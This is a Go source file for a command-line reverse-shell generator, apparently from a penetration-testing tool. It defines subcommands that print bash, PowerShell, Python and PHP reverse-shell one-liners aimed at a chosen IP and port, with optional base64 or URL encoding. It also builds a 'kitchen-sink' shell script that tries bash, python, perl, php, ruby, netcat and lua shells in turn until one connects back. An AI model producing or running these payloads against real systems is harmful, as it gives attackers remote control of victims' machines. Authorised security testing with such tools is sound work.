package cmd

import (
	"fmt"

	"github.com/spf13/cobra"
)

var bashCmd = &cobra.Command{
	Use:     "bash [ip] [port]",
	Short:   "Generate a bash reverse shell",
	GroupID: "shell",
	Args:    cobra.MaximumNArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		config := readConfigFromFile()
		params := CommandParams{
			Name:     "bash",
			Method:   "i",
			Shell:    "bash",
			Encoding: "none",
		}
		if config.Port != "" {
			params.Port = config.Port
		} else {
			params.Port = DefaultPort
		}

		if config.Shell != "" {
			params.Shell = config.Shell
		}
		if len(args) > 0 {
			params.IPAddress = args[0]
		} else {
			if config.IPAddress != "" {
				params.IPAddress = config.IPAddress
			} else {
				ips := getIP()
				if len(ips) > 0 {
					params.IPAddress = ips[0]
				}
			}
		}
		if len(args) > 1 {
			params.Port = args[1]
		}
		shell := getCommand(params)
		encoded := setEncoding(params.Encoding, shell)
		fmt.Println(encoded)
	},
}

var powershellCmd = &cobra.Command{
	Use:     "powershell [ip] [port]",
	Short:   "Generate a PowerShell reverse shell",
	GroupID: "shell",
	Args:    cobra.MaximumNArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		config := readConfigFromFile()
		params := CommandParams{
			Name:     "powershell",
			Method:   "base64",
			Encoding: "none",
		}
		if config.Port != "" {
			params.Port = config.Port
		} else {
			params.Port = DefaultPort
		}

		if config.Shell != "" {
			params.Shell = config.Shell
		}
		if len(args) > 0 {
			params.IPAddress = args[0]
		} else {
			if config.IPAddress != "" {
				params.IPAddress = config.IPAddress
			} else {
				ips := getIP()
				if len(ips) > 0 {
					params.IPAddress = ips[0]
				}
			}
		}
		if len(args) > 1 {
			params.Port = args[1]
		}
		shell := getCommand(params)
		fmt.Println(shell)
	},
}

var pythonCmd = &cobra.Command{
	Use:     "python [ip] [port]",
	Short:   "Generate a Python reverse shell",
	GroupID: "shell",
	Args:    cobra.MaximumNArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		config := readConfigFromFile()
		params := CommandParams{
			Name:     "python",
			Method:   "1",
			Encoding: "none",
		}
		if config.Port != "" {
			params.Port = config.Port
		} else {
			params.Port = DefaultPort
		}

		if config.Shell != "" {
			params.Shell = config.Shell
		}
		if len(args) > 0 {
			params.IPAddress = args[0]
		} else {
			if config.IPAddress != "" {
				params.IPAddress = config.IPAddress
			} else {
				ips := getIP()
				if len(ips) > 0 {
					params.IPAddress = ips[0]
				}
			}
		}
		if len(args) > 1 {
			params.Port = args[1]
		}
		shell := getCommand(params)
		fmt.Println(shell)
	},
}

var phpCmd = &cobra.Command{
	Use:     "php [ip] [port]",
	Short:   "Generate a PHP reverse shell",
	GroupID: "shell",
	Args:    cobra.MaximumNArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		config := readConfigFromFile()
		params := CommandParams{
			Name:     "php",
			Method:   "exec",
			Encoding: "none",
		}
		if config.Port != "" {
			params.Port = config.Port
		} else {
			params.Port = DefaultPort
		}

		if config.Shell != "" {
			params.Shell = config.Shell
		}
		if len(args) > 0 {
			params.IPAddress = args[0]
		} else {
			if config.IPAddress != "" {
				params.IPAddress = config.IPAddress
			} else {
				ips := getIP()
				if len(ips) > 0 {
					params.IPAddress = ips[0]
				}
			}
		}
		if len(args) > 1 {
			params.Port = args[1]
		}
		shell := getCommand(params)
		fmt.Println(shell)
	},
}

var sinkCmd = &cobra.Command{
	Use:     "sink [ip] [port]",
	Short:   "Generate a kitchen-sink reverse shell (*nix)",
	GroupID: "shell",
	Run: func(cmd *cobra.Command, args []string) {
		config := readConfigFromFile()
		ip := ""
		port := DefaultPort
		
		if config.Port != "" {
			port = config.Port
		}
		if len(args) > 0 {
			ip = args[0]
		} else if config.IPAddress != "" {
			ip = config.IPAddress
		} else if ips := getIP(); len(ips) > 0 {
			ip = ips[0]
		}
		if len(args) > 1 {
			port = args[1]
		}

		encoding, _ := cmd.Flags().GetString("encode")

		// Helper to fetch the exact raw string for a given payload type/method
		getRaw := func(name, method string) string {
			p := CommandParams{
				Name:      name,
				Method:    method,
				IPAddress: ip,
				Port:      port,
				Shell:     "/bin/sh",
			}
			return getCommand(p)
		}

		// Dynamically assemble the sink script based on revshells.go definitions
		script := fmt.Sprintf(`if command -v bash > /dev/null 2>&1; then
    bash -c '%s'
    if [ $? -eq 0 ]; then exit; fi
fi

if command -v python > /dev/null 2>&1; then
    %s
    if [ $? -eq 0 ]; then exit; fi
fi

if command -v sh > /dev/null 2>&1; then
    %s
    if [ $? -eq 0 ]; then exit; fi
fi

if command -v perl > /dev/null 2>&1; then
    %s
    if [ $? -eq 0 ]; then exit; fi
fi

if command -v php > /dev/null 2>&1; then
    %s
    if [ $? -eq 0 ]; then exit; fi
fi

if command -v ruby > /dev/null 2>&1; then
    %s
    if [ $? -eq 0 ]; then exit; fi
fi

if command -v nc > /dev/null 2>&1; then
    %s
fi

if command -v lua > /dev/null 2>&1; then
    %s
    if [ $? -eq 0 ]; then exit; fi
fi`,
			getRaw("bash", "i"),
			getRaw("python", "1"),
			getRaw("bash", "i"),
			getRaw("perl", "1"),
			getRaw("php", "exec"),
			getRaw("ruby", "1"),
			getRaw("nc", "mkfifo"),
			getRaw("lua", "1"),
		)

		encoded := setEncoding(encoding, script)
		fmt.Println(encoded)
	},
}

func init() {
	rootCmd.AddCommand(bashCmd)
	rootCmd.AddCommand(powershellCmd)
	rootCmd.AddCommand(pythonCmd)
	rootCmd.AddCommand(phpCmd)
	rootCmd.AddCommand(sinkCmd)
	for _, subCmd := range []*cobra.Command{bashCmd, powershellCmd, pythonCmd, phpCmd, sinkCmd} {
		subCmd.Flags().StringP("encode", "e", "none", "Encoding (none/base64/url/doubleurl)")
	}
}
